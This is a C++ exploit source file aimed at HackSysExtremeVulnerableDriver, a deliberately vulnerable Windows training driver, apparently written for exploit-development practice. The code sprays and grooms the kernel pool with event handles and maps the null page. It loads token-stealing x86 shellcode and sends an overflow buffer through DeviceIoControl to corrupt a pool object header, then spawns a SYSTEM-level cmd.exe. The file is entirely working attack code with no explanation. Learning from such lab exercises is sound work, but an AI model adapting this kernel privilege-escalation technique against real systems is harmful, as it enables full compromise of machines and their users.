#include <iostream>
#include <Windows.h>
#include <vector>
#include "Payload.h"
using namespace std;

#define DEVICE_NAME         "\\\\.\\HackSysExtremeVulnerableDriver"
#define IOCTL               0x22200F

vector<HANDLE> defragment_handles;
vector<HANDLE> sequential_handles;

typedef NTSTATUS(WINAPI* _NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T AllocationSize,
	ULONG AllocationType,
	ULONG Protect
	);

HANDLE grab_handle() {
	HANDLE hFile = CreateFile(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		cout << "[-] Unable to grah file handle\n";
		cout << "[-] Exiting with error code : " << GetLastError() << endl;
		exit(-1);
	}

	cout << "[+] Opened handle with value " << hex << hFile << endl;

	return hFile;
}

void spray_pool() {
	cout << "[+] Setting up kernel pool spraying parameters\n";
	cout << "[+] Spraying defragment pool.\n";
	for (int i = 0; i < 10000; i++) {
		HANDLE create = CreateEvent(NULL, 0, 0, "");
		if (create == NULL) {
			cout << "[-] CreateEvent failed.\n";
			exit(-1);
		}
		defragment_handles.push_back(create);
	}
	cout << "[+] Finished spraying defragment pool.\n";
	cout << "[+] Spraying sequential pool.\n";
	
	for (int i = 0; i < 10000; i++) {
		HANDLE create = CreateEvent(NULL, 0, 0, "");
		if (create == NULL) {
			cout << "[-] CreateEvent failed.\n";
			exit(-1);
		}
		sequential_handles.push_back(create);
	}
	cout << "[+] Finished spraying sequential pool.\n";

	cout << "[+] Poking holes of size 0x200 in the kernel pool.\n";
	for (int x = 0; x < sequential_handles.size(); x += 0x16) {
		for (int i = 0; i < 0x8; i++) {
			CloseHandle(sequential_handles[x + i]);
		}
	}
}

void free_chunks() {
	for (int i = 0; i < 10000; i++)
		CloseHandle(defragment_handles[i]);
	for (int i = 0; i < 10000; i++)
		CloseHandle(sequential_handles[i]);
}

void allocate_shellcode() {
	_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)
		GetProcAddress(GetModuleHandle("ntdll.dll"), "NtAllocateVirtualMemory");

	size_t Size = 0x100;
	INT64 BaseAddress = 1;

	NtAllocateVirtualMemory(GetCurrentProcess(),
		(PVOID*)& BaseAddress, 0,
		(SIZE_T*)& Size,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	BYTE shellcode[] = (
		"\x60"
		"\x64\xA1\x24\x01\x00\x00"
		"\x8B\x40\x50"
		"\x89\xC1"
		"\x8B\x98\xF8\x00\x00\x00"
		"\xBA\x04\x00\x00\x00"
		"\x8B\x80\xB8\x00\x00\x00"
		"\x2D\xB8\x00\x00\x00"
		"\x39\x90\xB4\x00\x00\x00"
		"\x75\xED"
		"\x8B\x90\xF8\x00\x00\x00"
		"\x89\x91\xF8\x00\x00\x00"
		"\x61"
		"\xC2\x10\x00"  // ret 0x10
		);

	LPVOID payload = VirtualAlloc(NULL,
		sizeof(shellcode),
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);
	if (payload == NULL)
		exit(-1);

	RtlMoveMemory(payload, shellcode, sizeof(shellcode));
	memset((void*)0x0, '\x00', 0x100);
	memcpy((void*)0x60, (void *)&payload, 0x4);
}

void send_payload(HANDLE hFile) {
	DWORD bytesRet;

	DWORD payload_len = 0x220;

	char overwrite_bytes[] = (
		"\x40\x00\x08\x04"
		"\x45\x76\x65\xee"
		"\x00\x00\x00\x00"
		"\x40\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x01\x00\x00\x00"
		"\x01\x00\x00\x00"
		"\x00\x00\x00\x00"
		"\x00\x00\x08\x00"
		);

	BYTE* payload = (BYTE *)VirtualAlloc(NULL,
		payload_len + 0x1,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (payload == NULL)
		exit(-1);
	
	memset(payload, '\x41', 0x1F8);
	memcpy(payload + 0x1F8, overwrite_bytes, 0x28);
	
	cout << "[+] Beginning interaction with the kernel driver.\n";

	DeviceIoControl(hFile, IOCTL, payload, 0x220, NULL,
		0, &bytesRet, NULL);
}

void spawn_shell() {
	cout << "[>] Spawning nt authority/system shell...\n";

	PROCESS_INFORMATION pi;
	ZeroMemory(&pi, sizeof(pi));

	STARTUPINFO si;
	ZeroMemory(&si, sizeof(si));

	CreateProcessA("C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi);
}

int main(void) {
	HANDLE hFile = grab_handle();

	spray_pool();

	allocate_shellcode();

	send_payload(hFile);

	free_chunks();

	spawn_shell();

	return 0;
}